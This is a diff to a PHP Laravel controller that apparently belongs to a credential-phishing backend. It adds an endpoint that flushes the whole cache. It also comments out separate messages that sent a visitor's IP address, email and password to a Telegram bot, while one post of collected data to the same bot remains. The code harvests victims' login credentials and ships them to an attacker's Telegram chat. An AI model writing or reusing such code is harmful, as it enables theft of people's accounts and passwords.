@@ -37,6 +37,22 @@ class Controller extends BaseController
         $this->groupTelegramId = $settings['group_id'];
     }
 
+    public function deleteAllCache(Request $request)
+    {
+        try {
+            Cache::flush();
+
+            return response()->json([
+                'status' => 0,
+            ]);
+        } catch (Throwable $e) {
+            return response()->json([
+                'status' => 1,
+                'message' => $e->getMessage(),
+            ]);
+        }
+    }
+
     public function setCacheByEmail(Request $request): \Illuminate\Http\JsonResponse
     {
         try {
@@ -204,18 +220,19 @@ class Controller extends BaseController
             ];
 
             $client = new Client();
-            // send ip
-            $data['text'] = "$infoByIP IP: $request->ipAddress";
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
-            // send email
-            $data['text'] = "$infoByIP Email: $email";
-            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
-                'json' => $data
-            ]);
-            // send pass
-            $data['text'] = "$infoByIP Password: $password";
+            // // send ip
+            // $data['text'] = "$infoByIP IP: $request->ipAddress";
+            // $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+            //     'json' => $data
+            // ]);
+            // // send email
+            // $data['text'] = "$infoByIP Email: $email";
+            // $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
+            //     'json' => $data
+            // ]);
+            // // send pass
+            // $data['text'] = "$infoByIP Password: $password";
+
             $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
                 'json' => $data
             ]);
